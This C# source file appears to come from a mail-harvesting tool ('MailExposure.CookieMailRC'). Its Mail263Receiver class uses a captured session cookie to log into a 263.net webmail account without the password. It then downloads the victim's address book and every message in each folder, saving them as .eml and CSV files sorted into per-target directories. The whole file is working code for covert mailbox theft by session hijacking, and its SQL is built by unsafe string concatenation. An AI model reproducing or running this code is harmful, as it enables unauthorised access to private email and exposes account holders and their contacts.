using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;

namespace MailExposure.CookieMailRC
{
    class Mail263Receiver : MailStr
    {
        // Fields
        private BoxNameId[] boxList;
        private CookieContainer cookieContainer;
        private string SID;
        private string url;
        private string urls;

        // Methods
        public Mail263Receiver()
        {
            this.boxList = new BoxNameId[200];
            this.urls = "";
            this.SID = "";
        }
        private void getBoxName()
        {
            int startIndex = 0;
            int index = 0;
            try
            {
                string message = "";
                this.url = base.Host + "?usr=" + base.m_username + "&sid=" + this.SID + "&func=fld&act=showmenu";
                base.charSet = "utf-8";
                base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                base.streamControl = true;
                base.MyStringBuilder = this.Request(this.url);
                message = base.MyStringBuilder.ToString();
                int num3 = Convert.ToInt32(base.putstr(message, "pagelines=\"", "\"", 0).Trim());
                while ((startIndex = message.IndexOf("<folder ", startIndex)) != -1)
                {
                    string str2 = base.putstr(message, "diridentity=\"", "\"", startIndex).Trim();
                    string str3 = base.putstr(message, "dirname=\"", "\"", startIndex).Trim();
                    int num4 = Convert.ToInt32(base.putstr(message, "emailnumber=\"", "\"", startIndex).Trim());
                    if (((str2 != "-1") && (str3 != "-1")) && ((str2 != "") && (str3 != "")))
                    {
                        this.boxList[index].boxid = str2;
                        this.boxList[index].boxname = str3;
                        this.boxList[index].page = num4 / num3;
                        this.boxList[index].pageCount = num3;
                        if ((num4 % num3) != 0)
                        {
                            this.boxList[index].page++;
                        }
                        index++;
                    }
                    startIndex++;
                }
                for (int i = 1; i < index; i++)
                {
                    this.getEmailId(this.boxList[i]);
                }
            }
            catch (Exception exception)
            {
                base.ShowMessage("取箱子失败！" + exception.Message);
            }

        }
        private void getEmailId(BoxNameId boxList)
        {
            base.charSet = "GB2312";
            base.BoxName = boxList.boxname;
            int startIndex = 0;
            string message = "";
            string emailText = "";
            try
            {
                if (boxList.page > 0)
                {
                    for (int i = 1; i <= boxList.page; i++)
                    {
                        this.url = base.Host + "?func=mlst&act=show&usr=" + base.m_username + "&sid=" + this.SID + "&fid=" + boxList.boxid + "&desc=1&pg=" + i.ToString() + "&searchword=&searchtype=&searchsub=&searchfd=&sort=4\r\n";
                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                        base.streamControl = true;
                        base.MyStringBuilder = this.Request(this.url);
                        message = base.MyStringBuilder.ToString();
                        while ((startIndex = message.IndexOf("<label for=", startIndex)) != -1)
                        {
                            string str3 = base.putstr(message, "<label for=\"", "\">", startIndex).Trim();
                            if (str3.IndexOf("new") != -1)
                            {
                                startIndex++;
                            }
                            else
                            {
                                if ((str3 != "-1") && (str3 != ""))
                                {
                                    string strSql = "select count(*) from 263mailId where MsgId='" + str3 + "'";
                                    if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(strSql)) == 0)
                                    {
                                        string str5 = str3.Replace("&", "%26").Replace("=", "%3D");
                                        string str6 = "func=mail&act=svmsg&usr=" + base.m_username + "&sid=" + this.SID + "&fid=" + boxList.boxid + "&fid2=&desc=1&num=" + boxList.pageCount.ToString() + "&mid=" + str5 + "&email=&pg=&dfd=&sort=4&jumppage=&area=&area=";
                                        this.url = base.Host + "?" + str6;
                                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                        base.streamControl = true;
                                        base.MyStringBuilder = this.Request(this.url);
                                        emailText = base.MyStringBuilder.ToString();
                                        this.Save263Email(emailText);
                                        try
                                        {
                                            string str7 = DateTime.Now.ToString();
                                            strSql = "insert into 263mailId(Name,MsgId,DownTime,MailType) values('" + base.m_username + "','" + str3 + "','" + str7 + "','" + base.BoxName.Substring(0, base.BoxName.Length % 10) + "')";
                                            GlobalValue.mainForm.ExecuteSQL(strSql);
                                        }
                                        catch (Exception exception)
                                        {
                                            base.ShowMessage("添加失败：" + exception.Message);
                                        }
                                        base.ShowMessage(base.BoxName + ":" + str3 + "下载");
                                    }
                                }
                                startIndex++;
                            }
                        }
                    }
                }
            }
            catch (Exception exception2)
            {
                base.ShowMessage(exception2.Message);
            }

        }
        public override void login()
        {
            if (base.m_UserType.IndexOf("无密用户") != -1)
            {
                this.cookieContainer = new CookieContainer();
                base.ShowMessage("开始登陆…………");
                base.cookie = base.validationLogin;
                this.url = base.emailuri;
                base.charSet = "utf-8";
                base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                base.streamControl = true;
                base.MyStringBuilder = this.Request(this.url);
                base.MyStringBuilder.ToString();
                if (Regex.Match(base.MyStringBuilder.ToString(), "<title>([^<]*)</title>").Groups[1].Value.Trim() == "263电子邮件")
                {
                    string str2 = "";
                    if (this.url.IndexOf("?") != -1)
                    {
                        base.Host = this.url.Substring(0, this.url.IndexOf("?"));
                    }
                    else
                    {
                        base.ShowMessage("取主机失败");
                        return;
                    }
                    if (this.url.IndexOf("sid=") != -1)
                    {
                        this.SID = base.putstr(this.url, "sid=", "&", 0);
                    }
                    str2 = base.putstr(this.url, "usr=", "&", 0);
                    if (str2 != "-1")
                    {
                        base.m_username = str2;
                    }
                    if ((base.Host != null) && (this.SID != ""))
                    {
                        base.ShowMessage("登陆成功.....");
                        base.charSet = "GB2312";
                        this.url = base.Host + "?usr=" + base.m_username + "&sid=" + this.SID + "&func=paddrsave&act=save";
                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                        base.streamControl = true;
                        base.MyStringBuilder = this.Request(this.url);
                        if (base.MyStringBuilder.ToString() != "")
                        {
                            this.SaveAddressbook(base.MyStringBuilder.ToString());
                        }
                        this.getBoxName();
                    }
                    else
                    {
                        base.LoginFail();
                        base.passwdErr();
                        base.ShowMessage("登陆失败！");
                    }
                }
                else
                {
                    base.LoginFail();
                    base.passwdErr();
                    base.ShowMessage("登陆失败！");
                }
            }

        }
        public StringBuilder PostData(string url, string indata)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.ServicePoint.Expect100Continue = false;
                request.Method = "POST";
                request.Headers.Add("Cookie", base.cookie);
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Pragma:no-cache\r\n");
                request.Accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*";
                request.Headers.Add("Accept-Language: en-us,ar-SA;q=0.9,de-DE;q=0.8,es-ES;q=0.7,tr-TR;q=0.6,ja-JP;q=0.5,en-GB;q=0.4,fr-FR;q=0.3,zh-CN;q=0.2,zh-TW;q=0.1");
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)";
                request.ContentLength = indata.Length;
                request.AllowAutoRedirect = false;
                request.KeepAlive = true;
                Stream requestStream = request.GetRequestStream();
                char[] chars = Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(indata));
                StreamWriter writer = new StreamWriter(requestStream);
                writer.Write(chars, 0, chars.Length);
                writer.Close();
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Thread.Sleep(10);
                response.GetResponseStream();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                string str = "";
                if (headers["Content-Type"] != null)
                {
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        base.MyStringBuilder = this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
            }
            catch (Exception exception)
            {
                base.ShowMessage("263post:" + exception.Message);
            }
            return base.MyStringBuilder;

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                    reader.Close();
                }
            }
            catch (Exception exception)
            {
                base.ShowMessage("263request:" + exception.Message);
            }
            return base.MyStringBuilder;

        }
        public void Save263Email(string EmailText)
        {
            try
            {
                string filePath = "";
                if ((GlobalValue.mainForm.saveFilePath != "") | (GlobalValue.mainForm.saveFilePath != null))
                {
                    filePath = GlobalValue.mainForm.saveFilePath;
                }
                this.Save263File(EmailText, filePath);
            }
            catch (Exception exception)
            {
                base.ShowMessage("保存邮件失败：" + exception.Message);
                return;
            }
            try
            {
                this.save263EmailCount();
                GlobalValue.mainForm.statusBarPanelEmailNumbersText.Text = (Convert.ToInt32(GlobalValue.mainForm.statusBarPanelEmailNumbersText.Text) + 1).ToString();
            }
            catch (Exception exception2)
            {
                base.ShowMessage(exception2.Message);
            }

        }
        public void save263EmailCount()
        {
            try
            {
                string str = "'" + DateTime.Today.ToString() + "'";
                string strSql = string.Concat(new object[] { "update users set 完成时间=", str, ",邮件数量='", base.m_emailno, "' where 服务器='", base.server, "' and 用户名='", base.m_username, "'" });
                GlobalValue.mainForm.ExecuteSQL(strSql);
            }
            catch (Exception exception)
            {
                base.ShowMessage(exception.Message);
            }

        }
        public void Save263File(string EmailText, string filePath)
        {
            base.m_emailno++;
            string str = ".eml";
            string str2 = DateTime.Now.Date.ToString("yyy-MM-dd");
            filePath = filePath + str2 + "邮件";
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            filePath = filePath + @"\" + base.m_snote;
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            filePath = filePath + @"\" + base.m_stype;
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            filePath = filePath + @"\" + base.mailType;
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            filePath = filePath + @"\" + base.m_username;
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            filePath = filePath + @"\" + base.BoxName;
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }
            Stream stream = File.Create(string.Concat(new object[] { filePath, @"\", base.BoxName, '-', Convert.ToInt32(base.m_emailno), str }));
            using (StreamWriter writer = new StreamWriter(stream, Encoding.GetEncoding("GB2312")))
            {
                writer.Write(EmailText);
            }
            stream.Close();
            stream = null;

        }
        public void SaveAddressbook(string EmailText)
        {
            string path = "";
            if ((GlobalValue.mainForm.saveFilePath != "") | (GlobalValue.mainForm.saveFilePath != null))
            {
                path = GlobalValue.mainForm.saveFilePath;
            }
            string str2 = DateTime.Now.Date.ToString("yyy-MM-dd");
            path = path + str2 + "邮件";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\" + base.m_snote;
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\" + base.m_stype;
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\" + base.mailType;
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\" + base.m_username;
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            path = path + @"\地址薄";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            Stream stream = File.Create(path + @"\" + base.m_username + "-paddress.csv");
            using (StreamWriter writer = new StreamWriter(stream, Encoding.Default))
            {
                writer.Write(EmailText);
            }
            stream.Close();
            stream = null;

        }

        // Nested Types
        [StructLayout(LayoutKind.Sequential)]
        private struct BoxNameId
        {
            public string boxname;
            public string boxid;
            public int pageCount;
            public int page;
        }

    }
}
